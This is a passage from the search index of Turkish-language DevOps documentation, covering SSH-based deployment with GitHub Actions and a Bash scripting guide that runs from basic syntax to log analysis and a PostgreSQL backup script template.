g\u00f6r\u00fcr ve Action (i\u015f\u00e7i) ba\u015flat\u0131r.</li> <li>GitHub'\u0131n i\u015f\u00e7isi, sizin sunucunuza SSH ile ba\u011flan\u0131r.</li> <li>Belirledi\u011finiz komutlar\u0131 (\u00f6rn: <code>deploy.sh</code>) \u00e7al\u0131\u015ft\u0131r\u0131r.</li> </ol>"},{"location":"scripts/automation/#2-hazrlk-secrets","title":"2. Haz\u0131rl\u0131k (Secrets) \ud83d\udd10","text":"<p>Sunucu \u015fifrenizi kodun i\u00e7ine (yml dosyas\u0131na) ASLA yazmay\u0131n. GitHub'\u0131n \"Secrets\" kasas\u0131n\u0131 kullan\u0131n.</p> <ol> <li>GitHub Reponuz -&gt; Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret.</li> <li>\u015eu bilgileri ekleyin:</li> </ol> Secret Ad\u0131 De\u011fer (\u00d6rnek) A\u00e7\u0131klama <code>HOST_IP</code> <code>1.2.3.4</code> Sunucunuzun IP adresi. <code>SSH_USER</code> <code>deployer</code> Ba\u011flanacak kullan\u0131c\u0131 (root kullanmay\u0131n). <code>SSH_KEY</code> <code>-----BEGIN OPENSSH...</code> Private Key'inizin (<code>id_ed25519</code>) tamam\u0131. <p>\u0130pucu: Private Key'i almak i\u00e7in: <code>cat ~/.ssh/id_ed25519</code> (Kendi bilgisayar\u0131n\u0131zdaki de\u011fil, sunucuya eri\u015fimi olan bir key olmal\u0131. Genelde yeni bir key pair \u00fcretilip Public olan sunucuya, Private olan GitHub'a verilir.)</p>"},{"location":"scripts/automation/#3-workflow-dosyas-yml","title":"3. Workflow Dosyas\u0131 (<code>.yml</code>) \ud83d\udcc4","text":"<p>Reponuzda <code>.github/workflows/deploy.yml</code> dosyas\u0131n\u0131 olu\u015fturun ve yap\u0131\u015ft\u0131r\u0131n:</p> <pre><code>name: Deploy to Server \ud83d\ude80\n\n# Ne zaman \u00e7al\u0131\u015fs\u0131n? (Sadece main branch'e push gelince)\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout Code\n        uses: actions/checkout@v3\n\n      - name: Pre-Flight Check (U\u00e7u\u015f \u00d6ncesi Kontrol) \ud83d\udee1\ufe0f\n        uses: appleboy/ssh-action@master\n        with:\n          host: ${{ secrets.HOST_IP }}\n          username: ${{ secrets.SSH_USER }}\n          key: ${{ secrets.SSH_KEY }}\n          port: 2222\n          script: |\n            # 1. Disk Dolu mu? (&gt;%90 ise Dur)\n            if [ $(df / | awk 'NR==2 {print $5}' | tr -d %) -gt 90 ]; then\n              echo \"\u274c DISK DOLU! Deploy iptal ediliyor.\"\n              exit 1\n            fi\n\n            # 2. Docker \u00e7al\u0131\u015f\u0131yor mu?\n            if ! systemctl is-active --quiet docker; then\n               echo \"\u274c Docker \u00e7al\u0131\u015fm\u0131yor!\"\n               exit 1\n            fi\n            echo \"\u2705 Sistem deploy i\u00e7in uygun.\"\n\n      - name: Copy Files via SCP (Dosyalar\u0131 Y\u00fckle)\n        uses: appleboy/scp-action@master\n        with:\n          host: ${{ secrets.HOST_IP }}\n          username: ${{ secrets.SSH_USER }}\n          key: ${{ secrets.SSH_KEY }}\n          port: 2222\n          source: \".\"\n          target: \"/home/${{ secrets.SSH_USER }}/app\"\n\n      - name: Execute Remote SSH (Komut \u00c7al\u0131\u015ft\u0131r)\n        uses: appleboy/ssh-action@master\n        with:\n          host: ${{ secrets.HOST_IP }}\n          username: ${{ secrets.SSH_USER }}\n          key: ${{ secrets.SSH_KEY }}\n          port: 2222\n          script: |\n            echo \"\ud83d\ude80 Deployment Basliyor...\"\n            cd /home/${{ secrets.SSH_USER }}/app\n\n            # Scriptlere izin ver\n            chmod +x docs/scripts/library/*.sh\n\n            # Docker containerlari yenile (Ornek)\n            # docker compose down &amp;&amp; docker compose up -d --build\n\n            # Bak\u0131m scriptini \u00e7al\u0131\u015ft\u0131r \n            ./docs/scripts/library/maintenance.sh\n\n            echo \"\u2705 Deployment Tamamlandi!\"\n</code></pre>"},{"location":"scripts/automation/#4-kritik-ne-yaplr-ne-yaplmaz-dos-donts","title":"4. Kritik: Ne Yap\u0131l\u0131r, Ne Yap\u0131lmaz? (Do's &amp; Don'ts) \ud83d\uded1","text":"<p>GitHub Actions \u00e7ok g\u00fc\u00e7l\u00fcd\u00fcr ama yanl\u0131\u015f kullan\u0131l\u0131rsa sunucuyu patlat\u0131r.</p>"},{"location":"scripts/automation/#yapilmasi-gerekenler-dos","title":"\u2705 YAPILMASI GEREKENLER (Do's)","text":"<ul> <li>Idempotent Scriptler Yaz\u0131n: Scriptiniz 100 kere de \u00e7al\u0131\u015fsa hata vermemeli.</li> <li>K\u00f6t\u00fc: <code>mkdir /app</code> (Klas\u00f6r varsa hata verir, CI durur).</li> <li>\u0130yi: <code>mkdir -p /app</code> (Varsa ge\u00e7er, yoksa kurar).</li> <li>\u00d6nce Staging: Ana sunucuya (<code>main</code> branch) yollamadan \u00f6nce, test sunucusunda (<code>dev</code> branch) deneyin.</li> <li>SSH Timeout: Ba\u011flant\u0131 koparsa ne olaca\u011f\u0131n\u0131 planlay\u0131n (<code>timeout</code> komutlar\u0131 kullan\u0131n).</li> </ul>"},{"location":"scripts/automation/#yapilmamasi-gerekenler-donts","title":"\u274c YAPILMAMASI GEREKENLER (Don'ts)","text":"<ul> <li>Root Kullanmak: Asla <code>root</code> ile ba\u011flanmay\u0131n. Bir hata t\u00fcm sunucuyu siler.</li> <li>Hassas Veri: <code>.env</code> dosyas\u0131n\u0131 repoya atmay\u0131n. Onu sunucuda elle olu\u015fturun veya GitHub Secrets ile enjekte edin.</li> <li>Database Migration: Otomatik yapmay\u0131n! Veri kayb\u0131 riski vard\u0131r. DB i\u015flerini manuel ve yedekli yap\u0131n.</li> </ul>"},{"location":"scripts/automation/#5-guvenlik-uyars","title":"5. G\u00fcvenlik Uyar\u0131s\u0131 \u26a0\ufe0f","text":"<p>Bu y\u00f6ntemde GitHub'a (Microsoft'a) sunucunuzun anahtar\u0131n\u0131 veriyorsunuz.</p> <ul> <li>Risk: GitHub hacklenirse veya hesab\u0131n\u0131z \u00e7al\u0131n\u0131rsa sunucunuza girebilirler.</li> <li>\u00d6nlem 1: GitHub hesab\u0131n\u0131zda 2FA (\u0130ki A\u015famal\u0131 Do\u011frulama) mutlaka a\u00e7\u0131k olsun.</li> <li>\u00d6nlem 2: Kulland\u0131\u011f\u0131n\u0131z SSH Key'i sunucuda <code>root</code> yetkisine bo\u011fmay\u0131n. Sadece deploy yapabilen k\u0131s\u0131tl\u0131 bir kullan\u0131c\u0131 (<code>deployer</code>) kullan\u0131n.</li> </ul>"},{"location":"scripts/automation/#6-ozet","title":"6. \u00d6zet","text":"<p>Bu yap\u0131 kurulduktan sonra:</p> <ol> <li>Kodda de\u011fi\u015fiklik yap.</li> <li><code>git push origin main</code> de.</li> <li>Arkan\u0131 yaslan, GitHub 1 dakika i\u00e7inde sunucunu g\u00fcncellesin. \u2615</li> </ol>"},{"location":"scripts/bash-guide/","title":"Bash Script Yazma Rehberi \ud83d\udcdc","text":"<p>Bu rehber, production ortamlar\u0131nda kullan\u0131lacak g\u00fcvenli, okunabilir ve bak\u0131m\u0131 kolay Bash script'leri yazman\u0131z i\u00e7in gereken her \u015feyi i\u00e7erir.</p>"},{"location":"scripts/bash-guide/#icindekiler","title":"\ud83d\udccb \u0130\u00e7indekiler","text":"<ol> <li>Temel Syntax</li> <li>De\u011fi\u015fkenler ve String \u0130\u015flemleri</li> <li>Ko\u015fullar ve D\u00f6ng\u00fcler</li> <li>Fonksiyonlar</li> <li>Dosya \u0130\u015flemleri</li> <li>Log Analizi</li> <li>Hata Y\u00f6netimi</li> <li>Production Script \u015eablonu</li> </ol>"},{"location":"scripts/bash-guide/#temel-syntax","title":"\ud83d\ude80 Temel Syntax","text":""},{"location":"scripts/bash-guide/#shebang-ve-strict-mode","title":"Shebang ve Strict Mode","text":"<p>Her script \u015fununla ba\u015flamal\u0131:</p> <pre><code>#!/bin/bash\nset -euo pipefail\n# -e: Hata olunca dur\n# -u: Tan\u0131ms\u0131z de\u011fi\u015fken kullan\u0131m\u0131nda dur\n# -o pipefail: Pipe'da hata olunca dur\n</code></pre>"},{"location":"scripts/bash-guide/#yorum-satrlar","title":"Yorum Sat\u0131rlar\u0131","text":"<pre><code># Tek sat\u0131r yorum\n\n: '\n\u00c7ok sat\u0131rl\u0131\nyorum blo\u011fu\n'\n</code></pre>"},{"location":"scripts/bash-guide/#komut-calstrma","title":"Komut \u00c7al\u0131\u015ft\u0131rma","text":"<pre><code># Komut \u00e7\u0131kt\u0131s\u0131n\u0131 de\u011fi\u015fkene at\nOUTPUT=$(ls -la)\nOUTPUT=`ls -la`  # Eski y\u00f6ntem (kullanma)\n\n# Komut ba\u015far\u0131l\u0131 m\u0131 kontrol et\nif command -v docker &amp;&gt; /dev/null; then\n    echo \"Docker kurulu\"\nfi\n</code></pre>"},{"location":"scripts/bash-guide/#degiskenler","title":"\ud83d\udce6 De\u011fi\u015fkenler ve String \u0130\u015flemleri","text":""},{"location":"scripts/bash-guide/#degisken-tanmlama","title":"De\u011fi\u015fken Tan\u0131mlama","text":"<pre><code># Basit de\u011fi\u015fken\nNAME=\"John\"\nAGE=30\n\n# Ortam de\u011fi\u015fkeni (t\u00fcm child process'lere aktar\u0131l\u0131r)\nexport DB_HOST=\"localhost\"\n\n# Read-only de\u011fi\u015fken\nreadonly API_KEY=\"secret123\"\n\n# Dizi (Array)\nSERVERS=(\"web1\" \"web2\" \"db1\")\necho \"${SERVERS[0]}\"  # web1\necho \"${SERVERS[@]}\"  # T\u00fcm elemanlar\necho \"${#SERVERS[@]}\" # Eleman say\u0131s\u0131\n</code></pre>"},{"location":"scripts/bash-guide/#string-islemleri","title":"String \u0130\u015flemleri","text":"<pre><code>TEXT=\"Hello World\"\n\n# Uzunluk\necho \"${#TEXT}\"  # 11\n\n# Substring\necho \"${TEXT:0:5}\"  # Hello\necho \"${TEXT:6}\"    # World\n\n# De\u011fi\u015ftirme\necho \"${TEXT/World/Bash}\"  # Hello Bash (ilk e\u015fle\u015fme)\necho \"${TEXT//o/0}\"        # Hell0 W0rld (t\u00fcm e\u015fle\u015fmeler)\n\n# B\u00fcy\u00fck/k\u00fc\u00e7\u00fck harf\necho \"${TEXT^^}\"  # HELLO WORLD\necho \"${TEXT,,}\"  # hello world\n\n# Varsay\u0131lan de\u011fer\necho \"${UNDEFINED_VAR:-default}\"  # default\necho \"${UNDEFINED_VAR:=default}\"  # default ve de\u011fi\u015fkene ata\n</code></pre>"},{"location":"scripts/bash-guide/#string-birlestirme","title":"String Birle\u015ftirme","text":"<pre><code>FIRST=\"John\"\nLAST=\"Doe\"\n\n# Y\u00f6ntem 1\nFULL=\"$FIRST $LAST\"\n\n# Y\u00f6ntem 2\nFULL=\"${FIRST} ${LAST}\"\n\n# Y\u00f6ntem 3 (printf)\nFULL=$(printf \"%s %s\" \"$FIRST\" \"$LAST\")\n</code></pre>"},{"location":"scripts/bash-guide/#kosullar-donguler","title":"\ud83d\udd00 Ko\u015fullar ve D\u00f6ng\u00fcler","text":""},{"location":"scripts/bash-guide/#if-else","title":"If-Else","text":"<pre><code># Say\u0131 kar\u015f\u0131la\u015ft\u0131rma\nif [ $AGE -gt 18 ]; then\n    echo \"Yeti\u015fkin\"\nelif [ $AGE -eq 18 ]; then\n    echo \"Tam 18\"\nelse\n    echo \"\u00c7ocuk\"\nfi\n\n# String kar\u015f\u0131la\u015ft\u0131rma\nif [ \"$NAME\" = \"John\" ]; then\n    echo \"Merhaba John\"\nfi\n\n# Dosya kontrolleri\nif [ -f \"/etc/passwd\" ]; then\n    echo \"Dosya var\"\nfi\n\nif [ -d \"/var/log\" ]; then\n    echo \"Dizin var\"\nfi\n\n# \u00c7oklu ko\u015ful\nif [ $AGE -gt 18 ] &amp;&amp; [ \"$NAME\" = \"John\" ]; then\n    echo \"Yeti\u015fkin John\"\nfi\n\n# Modern syntax (daha g\u00fcvenli)\nif [[ $AGE -gt 18 &amp;&amp; \"$NAME\" == \"John\" ]]; then\n    echo \"Yeti\u015fkin John\"\nfi\n</code></pre>"},{"location":"scripts/bash-guide/#karslastrma-operatorleri","title":"Kar\u015f\u0131la\u015ft\u0131rma Operat\u00f6rleri","text":"Operat\u00f6r Anlam\u0131 \u00d6rnek <code>-eq</code> E\u015fit <code>[ $A -eq $B ]</code> <code>-ne</code> E\u015fit de\u011fil <code>[ $A -ne $B ]</code> <code>-gt</code> B\u00fcy\u00fck <code>[ $A -gt $B ]</code> <code>-ge</code> B\u00fcy\u00fck veya e\u015fit <code>[ $A -ge $B ]</code> <code>-lt</code> K\u00fc\u00e7\u00fck <code>[ $A -lt $B ]</code> <code>-le</code> K\u00fc\u00e7\u00fck veya e\u015fit <code>[ $A -le $B ]</code> <code>=</code> String e\u015fit <code>[ \"$A\" = \"$B\" ]</code> <code>!=</code> String e\u015fit de\u011fil <code>[ \"$A\" != \"$B\" ]</code> <code>-z</code> String bo\u015f <code>[ -z \"$A\" ]</code> <code>-n</code> String bo\u015f de\u011fil <code>[ -n \"$A\" ]</code>"},{"location":"scripts/bash-guide/#dosya-test-operatorleri","title":"Dosya Test Operat\u00f6rleri","text":"Operat\u00f6r Anlam\u0131 <code>-f</code> Normal dosya <code>-d</code> Dizin <code>-e</code> Var (dosya veya dizin) <code>-r</code> Okunabilir <code>-w</code> Yaz\u0131labilir <code>-x</code> \u00c7al\u0131\u015ft\u0131r\u0131labilir <code>-s</code> Bo\u015f de\u011fil"},{"location":"scripts/bash-guide/#for-dongusu","title":"For D\u00f6ng\u00fcs\u00fc","text":"<pre><code># Basit d\u00f6ng\u00fc\nfor i in 1 2 3 4 5; do\n    echo \"Say\u0131: $i\"\ndone\n\n# Range\nfor i in {1..10}; do\n    echo \"Say\u0131: $i\"\ndone\n\n# Art\u0131\u015f miktar\u0131 ile\nfor i in {0..100..10}; do\n    echo \"Say\u0131: $i\"  # 0, 10, 20, ...\ndone\n\n# Dizi \u00fczerinde\nSERVERS=(\"web1\" \"web2\" \"db1\")\nfor server in \"${SERVERS[@]}\"; do\n    echo \"Sunucu: $server\"\ndone\n\n# Dosyalar \u00fczerinde\nfor file in /var/log/*.log; do\n    echo \"Log: $file\"\ndone\n\n# C-style\nfor ((i=0; i&lt;10; i++)); do\n    echo \"Say\u0131: $i\"\ndone\n</code></pre>"},{"location":"scripts/bash-guide/#while-dongusu","title":"While D\u00f6ng\u00fcs\u00fc","text":"<pre><code># Basit while\nCOUNT=0\nwhile [ $COUNT -lt 5 ]; do\n    echo \"Say\u0131: $COUNT\"\n    ((COUNT++))\ndone\n\n# Dosya okuma\nwhile IFS= read -r line; do\n    echo \"Sat\u0131r: $line\"\ndone &lt; /etc/passwd\n\n# Sonsuz d\u00f6ng\u00fc\nwhile true; do\n    echo \"\u00c7al\u0131\u015f\u0131yor...\"\n    sleep 1\ndone\n</code></pre>"},{"location":"scripts/bash-guide/#case-statement","title":"Case Statement","text":"<pre><code>read -p \"Se\u00e7im (1-3): \" CHOICE\n\ncase $CHOICE in\n    1)\n        echo \"Birinci se\u00e7enek\"\n        ;;\n    2)\n        echo \"\u0130kinci se\u00e7enek\"\n        ;;\n    3)\n        echo \"\u00dc\u00e7\u00fcnc\u00fc se\u00e7enek\"\n        ;;\n    *)\n        echo \"Ge\u00e7ersiz se\u00e7im\"\n        exit 1\n        ;;\nesac\n</code></pre>"},{"location":"scripts/bash-guide/#fonksiyonlar","title":"\ud83d\udd27 Fonksiyonlar","text":""},{"location":"scripts/bash-guide/#basit-fonksiyon","title":"Basit Fonksiyon","text":"<pre><code># Tan\u0131mlama\ngreet() {\n    echo \"Merhaba $1\"\n}\n\n# \u00c7a\u011f\u0131rma\ngreet \"John\"  # Merhaba John\n</code></pre>"},{"location":"scripts/bash-guide/#parametreler-ve-return","title":"Parametreler ve Return","text":"<pre><code>add() {\n    local num1=$1\n    local num2=$2\n    local result=$((num1 + num2))\n    echo $result  # Return yerine echo kullan\n}\n\n# Kullan\u0131m\nRESULT=$(add 5 3)\necho \"Sonu\u00e7: $RESULT\"  # 8\n</code></pre>"},{"location":"scripts/bash-guide/#hata-kontrolu-ile-fonksiyon","title":"Hata Kontrol\u00fc ile Fonksiyon","text":"<pre><code>check_file() {\n    local file=$1\n\n    if [ ! -f \"$file\" ]; then\n        echo \"HATA: $file bulunamad\u0131\" &gt;&amp;2\n        return 1\n    fi\n\n    echo \"Dosya mevcut: $file\"\n    return 0\n}\n\n# Kullan\u0131m\nif check_file \"/etc/passwd\"; then\n    echo \"Devam ediliyor...\"\nelse\n    echo \"Hata olu\u015ftu\"\n    exit 1\nfi\n</code></pre>"},{"location":"scripts/bash-guide/#dosya-islemleri","title":"\ud83d\udcc1 Dosya \u0130\u015flemleri","text":""},{"location":"scripts/bash-guide/#dosya-okuma","title":"Dosya Okuma","text":"<pre><code># T\u00fcm dosyay\u0131 oku\nCONTENT=$(cat /etc/hostname)\n\n# Sat\u0131r sat\u0131r oku\nwhile IFS= read -r line; do\n    echo \"Sat\u0131r: $line\"\ndone &lt; /etc/passwd\n\n# CSV okuma\nwhile IFS=',' read -r col1 col2 col3; do\n    echo \"S\u00fctun 1: $col1, S\u00fctun 2: $col2\"\ndone &lt; data.csv\n</code></pre>"},{"location":"scripts/bash-guide/#dosya-yazma","title":"Dosya Yazma","text":"<pre><code># \u00dczerine yaz\necho \"Yeni i\u00e7erik\" &gt; file.txt\n\n# Sona ekle\necho \"Ek sat\u0131r\" &gt;&gt; file.txt\n\n# \u00c7ok sat\u0131rl\u0131 yazma (heredoc)\ncat &gt; config.txt &lt;&lt; EOF\nserver {\n    listen 80;\n    server_name example.com;\n}\nEOF\n</code></pre>"},{"location":"scripts/bash-guide/#dosya-manipulasyonu","title":"Dosya Manip\u00fclasyonu","text":"<pre><code># Kopyala\ncp source.txt destination.txt\n\n# Ta\u015f\u0131/Yeniden adland\u0131r\nmv old.txt new.txt\n\n# Sil\nrm file.txt\n\n# Dizin olu\u015ftur\nmkdir -p /path/to/nested/dir\n\n# Dizin sil\nrm -rf /path/to/dir\n\n# \u0130zinleri de\u011fi\u015ftir\nchmod 755 script.sh\nchmod +x script.sh\n\n# Sahipli\u011fi de\u011fi\u015ftir\nchown user:group file.txt\n</code></pre>"},{"location":"scripts/bash-guide/#log-analizi","title":"\ud83d\udcca Log Analizi","text":""},{"location":"scripts/bash-guide/#nginx-access-log-analizi","title":"Nginx Access Log Analizi","text":"<pre><code>#!/bin/bash\nLOG_FILE=\"/var/log/nginx/access.log\"\n\necho \"=== NGINX LOG ANAL\u0130Z\u0130 ===\"\necho \"\"\n\n# En \u00e7ok istek yapan 10 IP\necho \"En \u00c7ok \u0130stek Yapan IP'ler:\"\nawk '{print $1}' \"$LOG_FILE\" | sort | uniq -c | sort -rn | head -10\n\n# En \u00e7ok ziyaret edilen URL'ler\necho \"\"\necho \"En \u00c7ok Ziyaret Edilen URL'ler:\"\nawk '{print $7}' \"$LOG_FILE\" | sort | uniq -c | sort -rn | head -10\n\n# HTTP status kodlar\u0131 da\u011f\u0131l\u0131m\u0131\necho \"\"\necho \"HTTP Status Kodlar\u0131:\"\nawk '{print $9}' \"$LOG_FILE\" | sort | uniq -c | sort -rn\n\n# 404 hatas\u0131 veren URL'ler\necho \"\"\necho \"404 Hatas\u0131 Veren URL'ler:\"\nawk '$9 == 404 {print $7}' \"$LOG_FILE\" | sort | uniq -c | sort -rn | head -10\n\n# 5xx hatalar (sunucu hatalar\u0131)\necho \"\"\necho \"5xx Sunucu Hatalar\u0131:\"\nawk '$9 ~ /^5/ {print $0}' \"$LOG_FILE\" | tail -20\n\n# Belirli zaman aral\u0131\u011f\u0131ndaki istekler\necho \"\"\necho \"Son 1 Saatteki \u0130stekler:\"\nawk -v date=\"$(date -d '1 hour ago' '+%d/%b/%Y:%H')\" '$4 ~ date' \"$LOG_FILE\" | wc -l\n</code></pre>"},{"location":"scripts/bash-guide/#syslog-analizi","title":"Syslog Analizi","text":"<pre><code>#!/bin/bash\nSYSLOG=\"/var/log/syslog\"\n\n# SSH login denemeleri\necho \"Ba\u015far\u0131s\u0131z SSH Giri\u015fleri:\"\ngrep \"Failed password\" \"$SYSLOG\" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn\n\n# Sudo kullan\u0131m\u0131\necho \"\"\necho \"Sudo Komutlar\u0131:\"\ngrep \"sudo:\" \"$SYSLOG\" | grep \"COMMAND\" | awk -F'COMMAND=' '{print $2}' | sort | uniq -c\n\n# Kernel hatalar\u0131\necho \"\"\necho \"Kernel Hatalar\u0131:\"\ngrep -i \"error\" \"$SYSLOG\" | grep \"kernel\" | tail -20\n\n# Disk doluluk uyar\u0131lar\u0131\necho \"\"\necho \"Disk Uyar\u0131lar\u0131:\"\ngrep -i \"no space left\" \"$SYSLOG\"\n</code></pre>"},{"location":"scripts/bash-guide/#application-log-analizi","title":"Application Log Analizi","text":"<pre><code>#!/bin/bash\nAPP_LOG=\"/var/log/myapp/app.log\"\n\n# Hata say\u0131s\u0131 (son 24 saat)\necho \"Son 24 Saatteki Hatalar:\"\ngrep -i \"error\" \"$APP_LOG\" | \\\n    awk -v date=\"$(date -d '24 hours ago' '+%Y-%m-%d')\" '$0 ~ date' | \\\n    wc -l\n\n# En s\u0131k g\u00f6r\u00fclen hata mesajlar\u0131\necho \"\"\necho \"En S\u0131k Hatalar:\"\ngrep -i \"error\" \"$APP_LOG\" | \\\n    sed 's/[0-9]\\{4\\}-[0-9]\\{2\\}-[0-9]\\{2\\}.*ERROR/ERROR/' | \\\n    sort | uniq -c | sort -rn | head -10\n\n# Response time analizi (JSON log i\u00e7in)\necho \"\"\necho \"Ortalama Response Time:\"\ngrep \"response_time\" \"$APP_LOG\" | \\\n    jq -r '.response_time' | \\\n    awk '{sum+=$1; count++} END {print sum/count \" ms\"}'\n\n# Belirli kullan\u0131c\u0131n\u0131n aktiviteleri\necho \"\"\necho \"user123 Aktiviteleri:\"\ngrep \"user_id.*user123\" \"$APP_LOG\" | tail -20\n</code></pre>"},{"location":"scripts/bash-guide/#real-time-log-izleme","title":"Real-time Log \u0130zleme","text":"<pre><code>#!/bin/bash\n\n# Canl\u0131 log takibi + filtreleme\ntail -f /var/log/nginx/access.log | grep --line-buffered \"POST\"\n\n# Renkli \u00e7\u0131kt\u0131 ile\ntail -f /var/log/app.log | \\\n    grep --line-buffered -E \"ERROR|WARNING|INFO\" | \\\n    sed 's/ERROR/\\x1b[31m&amp;\\x1b[0m/g; s/WARNING/\\x1b[33m&amp;\\x1b[0m/g; s/INFO/\\x1b[32m&amp;\\x1b[0m/g'\n\n# \u00c7oklu log dosyas\u0131\ntail -f /var/log/nginx/*.log\n\n# Pattern matching ile alarm\ntail -f /var/log/app.log | while read line; do\n    if echo \"$line\" | grep -q \"CRITICAL\"; then\n        echo \"\ud83d\udea8 ALARM: $line\"\n        # Slack/Email g\u00f6nder\n    fi\ndone\n</code></pre>"},{"location":"scripts/bash-guide/#hata-yonetimi","title":"\u26a0\ufe0f Hata Y\u00f6netimi","text":""},{"location":"scripts/bash-guide/#exit-kodlar","title":"Exit Kodlar\u0131","text":"<pre><code># Ba\u015far\u0131l\u0131\nexit 0\n\n# Hata\nexit 1\n\n# Son komutun exit kodu\necho $?\n\n# \u00d6zel hata kodlar\u0131\nexit 2  # Kullan\u0131m hatas\u0131\nexit 126  # Komut \u00e7al\u0131\u015ft\u0131r\u0131lamad\u0131\nexit 127  # Komut bulunamad\u0131\n</code></pre>"},{"location":"scripts/bash-guide/#trap-ile-cleanup","title":"Trap ile Cleanup","text":"<pre><code>#!/bin/bash\nset -euo pipefail\n\n# Ge\u00e7ici dosya\nTEMP_FILE=$(mktemp)\n\n# Script bitince veya hata olunca temizle\ncleanup() {\n    echo \"Temizlik yap\u0131l\u0131yor...\"\n    rm -f \"$TEMP_FILE\"\n}\n\ntrap cleanup EXIT ERR\n\n# Script devam eder...\necho \"\u0130\u015flem yap\u0131l\u0131yor...\"\n</code></pre>"},{"location":"scripts/bash-guide/#hata-loglama","title":"Hata Loglama","text":"<pre><code>#!/bin/bash\nLOG_FILE=\"/var/log/myscript.log\"\n\nlog() {\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $1\" | tee -a \"$LOG_FILE\"\n}\n\nerror() {\n    log \"ERROR: $1\" &gt;&amp;2\n    exit 1\n}\n\n# Kullan\u0131m\nlog \"Script ba\u015flad\u0131\"\n\nif [ ! -f \"/etc/config\" ]; then\n    error \"Config dosyas\u0131 bulunamad\u0131\"\nfi\n\nlog \"\u0130\u015flem tamamland\u0131\"\n</code></pre>"},{"location":"scripts/bash-guide/#production-sablon","title":"\ud83c\udfc6 Production Script \u015eablonu","text":"<pre><code>#!/bin/bash\n#\n# Script Ad\u0131: backup-database.sh\n# A\u00e7\u0131klama: PostgreSQL veritaban\u0131 yede\u011fi al\u0131r\n# Yazar: DevOps Team\n# Versiyon: 1.0.0\n# Kullan\u0131m: ./backup-database.sh [database_name]\n#\n\nset -euo pipefail  # Strict mode\n\n# ============================================\n# YAPILANDIRMA\n# ============================================\nreadonly SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" &amp;&amp; pwd)\"\nreadonly SCRIPT_NAME=\"$(basename \"$0\")\"\nreadonly LOG_FILE=\"/var/log/${SCRIPT_NAME%.sh}.log\"\nreadonly BACKUP_DIR=\"/opt/backups/postgres\"\nreadonly RETENTION_DAYS=7\n\n# Renk kodlar\u0131\nreadonly RED='\\033[0;31m'\nreadonly GREEN='\\033[0;32m'\nreadonly YELLOW='\\033[1;33m'\nreadonly NC='\\033[0m' # No Color\n\n# ============================================\n# FONKS\u0130YONLAR\n# ============================================\n\n# Log fonksiyonu\nlog() {\n    local level=$1\n    shift\n    local message=\"$@\"\n    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')\n    echo \"[${timestamp}] [${level}] ${message}\" | tee -a \"$LOG_FILE\"\n}\n\ninfo() {\n    log \"INFO\" \"$@\"\n}\n\nwarn() {\n    log \"WARN\" \"$@\"\n}\n\nerror() {\n    log \"ERROR\" \"$@\" &gt;&amp;2\n}\n\n# Ba\u015far\u0131l\u0131 mesaj\nsuccess() {\n    echo -e \"${GREEN}\u2713${NC} $@\"\n    info \"$@\"\n}\n\n# Hata mesaj\u0131 ve \u00e7\u0131k\u0131\u015f\ndie() {\n    echo -e \"${RED}\u2717${NC} $@\" &gt;&amp;2\n    error \"$@\"\n    exit 1\n}\n\n# Gerekli komutlar\u0131 kontrol et\ncheck_requirements() {\n    local missing=()\n\n    for cmd in pg_dump gzip; do\n        if ! command -v \"$cmd\" &amp;&gt; /dev/null; then\n            missing+=(\"$cmd\")\n        fi\n    done\n\n    if [ ${#missing[@]} -gt 0 ]; then\n        die \"Eksik komutlar: ${missing[*]}\"\n    fi\n}\n\n# Cleanup fonksiyonu\ncleanup() {\n    if [ -n \"${TEMP_FILE:-}\" ] &amp;&amp; [ -f \"$TEMP_FILE\" ]; then\n        rm -f \"$TEMP_FILE\"\n    fi\n}\n\n# Trap ayarla\ntrap cleanup EXIT ERR INT TERM\n\n# Kullan\u0131m bilgisi\nusage() {\n    cat &lt;&lt; EOF\nKullan\u0131m: $SCRIPT_NAME [OPTIONS] DATABASE_NAME\n\nPostgreSQL veritaban\u0131 yede\u011fi al\u0131r.\n\nOPTIONS:\n    -h, --help          Bu yard\u0131m mesaj\u0131n\u0131 g\u00f6ster\n    -d, --dir DIR       Yedek dizini (varsay\u0131lan: $BACKUP_DIR)\n    -r, --retention N   Yedek saklama s\u00fcresi (g\u00fcn) (varsay\u0131lan: $RETENTION_DAYS)\n\n\u00d6RNEK:\n    $SCRIPT_NAME myapp_db\n    $SCRIPT_NAME --dir /mnt/backups --retention 14 myapp_db\n\nEOF\n    exit 0\n}\n\n# ============================================\n# ANA FONKS\u0130YON\n# ============================================\n\nmain() {\n    local db_name=\"\"\n    local backup_dir=\"$BACKUP_DIR\"\n    local retention=\"$RETENTION_DAYS\"\n\n    # Arg\u00fcman parse\n    while [[ $# -gt 0 ]]; do\n        case $1 in\n            -h|--help)\n                usage\n                ;;\n            -d|--dir)\n                backup_dir=\"$2\"\n                shift 2\n                ;;\n            -r|--retention)\n                retention=\"$2\"\n                shift 2\n                ;;\n            -*)\n                die \"Bilinmeyen opsiyon: $1\"\n                ;;\n            *)\n                db_name=\"$1\"\n                shift\n                ;;\n        esac\n    done\n\n    # Validasyon\n    [ -z \"$db_name\" ] &amp;&amp; die \"Veritaban\u0131 ad\u0131 belirtilmedi. Kullan\u0131m i\u00e7in: $SCRIPT_NAME --help\"\n\n    info \"Script ba\u015flat\u0131ld\u0131: $SCRIPT_NAME\"\n    info \"Veritaban\u0131: $db_name\"\n\n    # Gereksinimler\n    check_requirements\n\n    # Backup dizini olu\u015ftur\n    mkdir -p \"$backup_dir\" || die \"Backup dizini olu\u015fturulamad\u0131: $backup_dir\"\n\n    # Backup dosya ad\u0131\n    local timestamp=$(date '+%Y%m%d_%H%M%S')\n    local backup_file=\"${backup_dir}/${db_name}_${timestamp}.sql.gz\"\n\n    # Backup al\n    info \"Yedek al\u0131n\u0131yor: $backup_file\"\n\n    if pg_dump \"$db_name\" | gzip &gt; \"$backup_file\"; then\n        success \"Yedek ba\u015far\u0131yla al\u0131nd\u0131: $backup_file\"\n\n        # Dosya boyutu\n        local size=$(du -h \"$backup_file\" | cut -f1)\n        info \"Dosya boyutu: $size\"\n    else\n        die \"Yedek al\u0131namad\u0131\"\n    fi\n\n    # Eski yedekleri temizle\n    info \"Eski yedekler temizleniyor (${retention} g\u00fcnden eski)...\"\n    